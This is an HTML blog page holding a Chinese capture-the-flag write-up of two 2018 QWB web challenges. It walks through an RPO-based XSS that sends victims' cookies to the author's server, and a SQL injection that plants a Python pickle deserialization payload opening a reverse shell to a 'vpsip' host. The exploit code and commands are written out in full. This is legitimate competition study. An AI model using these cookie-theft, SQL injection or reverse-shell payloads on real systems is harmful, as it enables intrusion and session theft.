@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="zh_cn">
+
+<head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="chrome=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer">
+<meta name="description" content="一个孤独散步者的梦">
+
+
+<meta property="twitter:title" content="第二届强网杯Web部分 Writeup">
+
+    <meta property="twitter:card" content="summary">
+
+<meta property="twitter:description" content="">
+
+<title>
+
+
+     诗与胡说 - 第二届强网杯Web部分 Writeup 
+
+</title>
+<link rel="canonical" href="https://kylingit.com/blog/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86-writeup/">
+
+
+<link rel="stylesheet" href="https://kylingit.com/css/main.v0.9.1.css">
+<link rel="stylesheet" href="https://kylingit.com/css/ionicons.min.css">
+
+
+  <link rel="stylesheet" href="https://kylingit.com/css/highlight.min.css">
+
+
+
+  <link rel="stylesheet" href="https://kylingit.com/css/progressively.min.css">
+
+
+
+
+
+<link rel="shortcut icon"
+
+    href="https://kylingit.com/img/favicon.png"
+
+>
+
+
+
+
+</head>
+
+
+<body>
+
+
+<section class="header">
+
+    <div class="container">
+        <a href="https://kylingit.com/"><img class="logo" src="https://kylingit.com/img/logo.jpg" alt="logo" /></a>
+        <div class="content">
+            <a href="https://kylingit.com/"><div class="name"><h1>诗与胡说</h1></div></a>
+            <nav>
+                <ul>
+                    
+                        <a href="https://kylingit.com/blog/"><li>Blog</li></a>
+                    
+                    
+                        
+                    
+                        
+                            
+                            <a href="https://kylingit.com/about"><li>about</li></a>
+                            
+                        
+                    
+                        
+                            
+                        
+                    
+                        
+                            
+                            <a href="https://kylingit.com/projects"><li>projects</li></a>
+                            
+                        
+                    
+                    
+                        
+                            <a href="https://kylingit.com/notes/"><li>notes</li></a>
+                        
+                    
+                        
+                    
+                </ul>
+            </nav>
+        </div>
+    </div>
+</section>
+
+
+<section class="main post non-narrow zero-top-spacing">
+    <div class="container">
+        <div class="content">
+            <div class="front-matter">
+                <div class="title-container">
+                    <div class="page-heading">
+
+    第二届强网杯Web部分 Writeup
+
+</div>
+
+                </div>
+                <div class="meta">
+                    <div class="date" title="Tue Mar 27 2018 18:06:02 UTC">Mar 27, 2018</div>
+                    <div class="reading-time"><div class="middot"></div>2 minutes read</div>
+                </div>
+            </div>
+            <div class="markdown">
+                
+    
+    
+
+<p>强网杯Web部分的题难度不小，还是比较有意思的，收获很大，这里简单分析一下其中两道题</p>
+
+<h3 id="share-your-mind">Share your mind</h3>
+
+<pre><code>http://39.107.33.96:20000
+Please help me find the vulnerability before I finish this site！
+hint：xss bot使用phantomjs，版本2.1.1
+hint2 : xss的点不在report页面
+</code></pre>
+
+<p>根据writeup描述，这是一道RPO攻击的题目，以前没接触过，趁机学习一波</p>
+
+<p>首先注册用户登录，查看源码，最后几行，可以看到引用js的时候这里使用了相对路径，构成RPO攻击的条件，简单尝试几个url发现确实可以利用。</p>
+
+<p>RPO攻击的原理可以参考</p>
+
+<p><a href="https://www.cnblogs.com/iamstudy/articles/ctf_writeup_rpo_attack.html">https://www.cnblogs.com/iamstudy/articles/ctf_writeup_rpo_attack.html</a></p>
+
+<p><a href="http://blog.nsfocus.net/rpo-attack/">http://blog.nsfocus.net/rpo-attack/</a></p>
+
+<p>访问<code>http://39.107.33.96:20000/index.php/view/article/1226</code>的时候加载<code>jquery.min.js</code>的路径可以看到是正常的，</p>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/oHZtz" alt="jquery.js" />
+当访问<code>http://39.107.33.96:20000/index.php/view/article/1226/..%2f..%2f..%2f..%2findex.php</code>的时候浏览器尝试加载<code>..%2f..%2f..%2f..%2findex.php/static/js/jquery.min.js</code>这个数据，而服务端则往上读取三层路径，加载的是article的页面，如果article页面存在xss的话就会被加载，题目也正好满足要求，所以我们创建一篇文章写入获取cookie的js,利用这个url让服务器请求这篇文章，弹给我们cookie</p>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/pa5qf" alt="jquery.js" /></p>
+
+<p>因为页面对一些特殊符号做了编码过滤，所以我们使用<code>String.fromCharCode()</code>方法从ascii码来加载js</p>
+
+<pre><code>window.location.href=String.fromCharCode(some ascii code) + document.cookie;
+</code></pre>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/SVQMd" alt="md5" />
+这里有两个点的绕过：</p>
+
+<ul>
+<li>url部分做了同站检测，通过<code>http://39.107.33.96:20000@x.x.x.x</code>的形式绕过</li>
+<li>这里的code每次刷新都是随机的，而且通过<code>===</code>比较，没法通过弱类型绕过，所以我们生成所有6位字符的MD5，搜索前6位符合条件的就行(实际上生成了大约200M的文件基本够用了)</li>
+</ul>
+
+<p>根据提示要访问<code>/QWB_fl4g/QWB/</code>页面，所以我们在vps上建一个带iframe的页面</p>
+
+<pre><code>&lt;img src='http://39.107.33.96:20000/QWB_fl4g/QWB/index.php'&gt;  
+&lt;iframe src='http://39.107.33.96:20000/QWB_fl4g/QWB/index.php/..%2f..%2f../index.php/view/article/1462/..%2f..%2f..%2f..%2findex.php'&gt;&lt;/iframe&gt;
+</code></pre>
+
+<p>nc监听端口，xssbot会先访问<code>/QWB_fl4g/QWB/index.php</code>，带上cookie后再访问article，触发xss，我们就能收到cookie</p>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/yDw2L" alt="flag" /></p>
+
+<h3 id="python-is-the-best-language-2">python is the best language #2</h3>
+
+<p>考点：session处存在反序列化漏洞</p>
+
+<p><code>app/others.py</code> <code>FilterException</code>类<code>load</code>方法存在反序列化漏洞</p>
+
+<pre><code class="language-python">class FilterException(Exception):
+
+    def __init__(self, value):
+        super(FilterException, self).__init__(
+            'the callable object {value} is not allowed'.format(value=str(value)))
+
+
+def _hook_call(func):
+    def wrapper(*args, **kwargs):
+        print args[0].stack
+        if args[0].stack[-2] in black_type_list:
+            raise FilterException(args[0].stack[-2])
+        return func(*args, **kwargs)
+    return wrapper
+
+
+def load(file):
+    unpkler = Unpkler(file)
+    unpkler.dispatch[REDUCE] = _hook_call(unpkler.dispatch[REDUCE])
+    return Unpkler(file).load()
+</code></pre>
+
+<p>先测试一下序列化与反序列化过程可能产生的安全问题</p>
+
+<ul>
+<li>序列化</li>
+</ul>
+
+<pre><code class="language-python">import os
+from pickle import Pickler
+
+class test(object):
+    def __reduce__(self):
+        return (os.system, ('whoami'))
+evil = test()
+
+def dump(file):
+    pk = Pickler(file)
+    pk.dump(evil)
+
+with open('test', 'wb') as f:
+    dump(f)
+</code></pre>
+
+<p>会将python对象序列化成字符串写入文件，类似这个样子</p>
+
+<pre><code>cnt
+system
+p0
+(S'whoami'
+p1
+tp2
+Rp3
+.
+</code></pre>
+
+<ul>
+<li>反序列化</li>
+</ul>
+
+<pre><code class="language-python">from pickle import Unpickler
+
+def load(file):
+    return Unpickler(file).load()
+
+with open('test', 'rb') as f:
+    load(f)
+</code></pre>
+
+<p>从文件读取进行反序列化，如果含有可执行的命令就会执行</p>
+
+<p>题目中对一些系统命令加入了黑名单，没法直接使用，但是这里可以用<code>subprocess</code>、<code>commands</code>等，同样是执行系统命令</p>
+
+<p><code>load()</code>方法并没有对传入的<code>file</code>进行任何过滤，就会导致反序列化漏洞</p>
+
+<p>全局搜索一下调用<code>load()</code>方法的部分</p>
+
+<p><code>app/Mycache.py</code>
+<code>get()</code>方法</p>
+
+<pre><code class="language-python">def get(self, key):
+    filename = self._get_filename(key)
+    try:
+        with open(filename, 'rb') as f:
+            pickle_time = load(f)
+            if pickle_time == 0 or pickle_time &gt;= time():
+                a = load(f)
+                return a
+            else:
+                os.remove(filename)
+                return None
+    except (IOError, OSError, PickleError):
+        return None
+</code></pre>
+
+<p>传入filename进行了load，跟进<code>_get_filename()</code>方法</p>
+
+<pre><code class="language-python">def _get_filename(self, key):
+    if isinstance(key, text_type):
+        key = key.encode('utf-8')  # XXX unicode review
+    hash = md5(key).hexdigest()
+    return os.path.join(self._path, hash)
+</code></pre>
+
+<p>可以看到对key进行了MD5加密</p>
+
+<p>再搜索调用<code>get()</code>方法的地方</p>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/S2Qaa" alt="get()" /></p>
+
+<pre><code class="language-python">def open_session(self, app, request):
+    sid = request.cookies.get(app.session_cookie_name)
+    if not sid:
+        sid = self._generate_sid()
+        return self.session_class(sid=sid, permanent=self.permanent)
+    if self.use_signer:
+        signer = self._get_signer(app)
+        if signer is None:
+            return None
+        try:
+            sid_as_bytes = signer.unsign(sid)
+            sid = sid_as_bytes.decode()
+        except BadSignature:
+            sid = self._generate_sid()
+            return self.session_class(sid=sid, permanent=self.permanent)
+    data = self.cache.get(self.key_prefix + sid)
+    if data is not None:
+        return self.session_class(data, sid=sid)
+    return self.session_class(sid=sid, permanent=self.permanent)
+</code></pre>
+
+<p>发现在<code>app/Mysessions.py</code>处理session部分的方法调用了<code>get</code>，传进去的参数是<code>self.key_prefix + sid</code>，即<code>前缀+session</code>值，类似这个样子
+<code>bdwsessions855f1297-d81e-4366-aaaa-80c9edb87338</code></p>
+
+<p>配置文件里看到<code>SESSION_FILE_DIR = &quot;/tmp/ffff&quot;</code></p>
+
+<p>所以整个流程大致是这样:</p>
+
+<p>用户注册或登录，取得cookie中的session值，加上前缀后再对文件名进行MD5加密，存储在<code>/tmp/ffff</code>目录下</p>
+
+<p>在验证用户的过程中，对<code>/tmp/ffff</code>目录相应文件名文件进行反序列化，假如我们对文件名和文件内容可控，那么就可以造成漏洞</p>
+
+<p>结合上一个sql注入漏洞，我们可以<code>select evilcode into outfile '/tmp/ffff/md5';</code></p>
+
+<p>在访问页面的时候修改session值为md5对应的明文，就可以让程序反序列化含有恶意代码的md5文件</p>
+
+<p>修改上面序列化代码:</p>
+
+<pre><code class="language-python">import cPickle
+import os
+import subprocess
+class Exploit(object):
+    def __reduce__(self):
+        return (subprocess.Popen, (&quot;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;vpsip\&quot;,82));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);'&quot;,))
+shellcode = cPickle.dumps(Exploit())
+print '0x' + shellcode .encode('hex')
+</code></pre>
+
+<p>假设我们要设置session为testabcd，对应的<code>bdwsessionstestabcd</code>md5值为<code>209a05e8b11c8e74ab03c110e6e5d591</code></p>
+
+<p>构造sql语句</p>
+
+<pre><code class="language-sql">select id from user where email = 'test'/**/union/**/select/**/0x63636F6D6D616E64730A../**/into/**/dumpfile/**/'/tmp/ffff/209a05e8b11c8e74ab03c110e6e5d591'#@test.com'
+</code></pre>
+
+<p>这样就把十六进制的恶意代码写入了<code>/tmp/ffff/</code>下</p>
+
+<p>然后访问index，修改cookie的session值为<code>testabcd</code>，触发反序列化漏洞后反弹shell</p>
+
+<p><img src="https://ob5vt1k7f.qnssl.com/mYzKP" alt="reverse_shell" /></p>
+
+<p>总结：
+- RPO可以结合XSS进行攻击，开发时不注意的话容易被利用
+- 反序列化问题一直都存在，这道题中虽然代码比较简单，利用起来还是有几个坑，还需要多学习</p>
+
+
+                <br>
+                <p><a href="https://kylingit.com/blog">Back to posts</a></p>
+            </div>
+            <br>
+            <div class="disqus">
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'kylingit';
+    var disqus_identifier = 'https:\/\/kylingit.com\/blog\/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86-writeup\/';
+    var disqus_title = '第二届强网杯Web部分 Writeup';
+    var disqus_url = 'https:\/\/kylingit.com\/blog\/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86-writeup\/';
+
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section class="footer">
+    <div class="container">
+        <div class="copyright">
+
+        
+            <a href="https://kylingit.com/license">Copyright © 2018 kylinking</a>
+        
+
+        </div>
+        <div class="icons">
+
+        
+            <a href="https://github.com/kylingit" target="_blank">
+                <i class="icon ion-social-github" title="github"></i>
+            </a>
+        
+
+        
+
+        
+
+        
+            <a href="mailto:ikylinking@gmail.com">
+                <i class="icon ion-ios-email larger" title="email"></i>
+            </a>
+        
+
+        
+            <a href="https://kylingit.com/index.xml">
+                <i class="icon ion-social-rss larger" title="rss"></i>
+            </a>
+        
+
+        </div>
+    </div>
+</section>
+
+
+  <script src="https://kylingit.com/js/highlight.min.js" defer></script>
+  
+
+
+
+  <script src="https://kylingit.com/js/progressively.min.js" defer></script>
+
+
+<script>
+  window.onload = function() {
+    
+      hljs.initHighlighting();
+    
+    
+      progressively.init({delay: 30, throttle: 50});
+    
+  };
+</script>
+
+</body>
+</html>
+
